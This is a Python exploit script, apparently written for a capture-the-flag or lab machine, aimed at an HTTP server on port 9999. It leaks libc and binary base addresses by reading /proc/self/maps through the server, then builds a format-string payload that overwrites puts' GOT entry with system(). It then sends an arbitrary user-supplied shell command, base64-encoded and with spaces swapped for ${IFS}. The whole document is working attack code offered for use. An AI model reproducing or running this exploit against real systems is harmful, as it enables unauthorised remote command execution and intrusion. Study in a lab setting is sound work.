#!/usr/bin/env python3
import base64
import fcntl
import requests
import socket
import struct
import sys
import urllib.parse

def pad(s):
    return s+b"."*(1024-len(s))

def get_memory_base_addresses(ip, port=9999):
     r = requests.get(f'http://{ip}:{port}//proc/self/maps', headers={"Range": "bytes=0-1000000"})
     libc_base = int([x for x in r.text.split('\n') if 'libc-' in x][0].split('-')[0], 16)
     httpserver_base = int([x for x in r.text.split('\n') if 'httpserver' in x][0].split('-')[0], 16)
     return (httpserver_base, libc_base)
 
 
if len(sys.argv) != 3:
    print(f'[-] Usage: {sys.argv[0]} [target ip] [command]')
    sys.exit()
 
target_ip = sys.argv[1]
cmd = sys.argv[2]
 
# readelf -s libc-2.27.so_ | grep " system@@GLIBC"
#  1510: 0003cd10    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
# readelf -s /usr/lib/i386-linux-gnu/libc-2.28.so | grep " system@@GLIBC"                   
#  1525: 0003ec00    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0  
system_offsets = {'10.129.1.163': int('3cd10', 16),
                   '127.0.0.1':    int('3ec00', 16)}
 
try:
    system_offset = system_offsets[target_ip]
except KeyError:
    print(f"[-] Invalid target: {target_ip}")
    sys.exit(1)
 
main_base, libc_base = get_memory_base_addresses(ip=target_ip)
print(f"[+] Main base address:   0x{main_base:08x}")
print(f"[+] libc base address:   0x{libc_base:08x}")

puts_got = main_base + 0x5048
print(f"[+] GOT table for puts:  0x{puts_got:08x}")

system = libc_base + system_offset
print(f"[+] system address:      0x{system:08x}")
system_lower = system % pow(2,16)
system_upper = system // pow(2,16)
print(f'[+] system lower:            0x{system_lower:04x}')
print(f'[+] system upper:        0x{system_upper:04x}')
 
exploit = b""
exploit += struct.pack("I", puts_got)
exploit += struct.pack("I", puts_got+2)
exploit += f'%53${system_lower - 8}x'.encode()
exploit += b'%53$n'
exploit += f'%54${system_upper - system_lower + pow(2,16)}x'.encode()
exploit += b'%54$n'

command = f'echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | /bin/sh'.replace(' ', '${IFS}')

print(f"[*] Command: {cmd}")
print(f"[*] Encoded command: {command}")
print("[*] Sending exploit")
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, 9999))
s.send(f'{command} /{urllib.parse.quote(pad(exploit))}\r\n\r\n'.encode())
s.close()
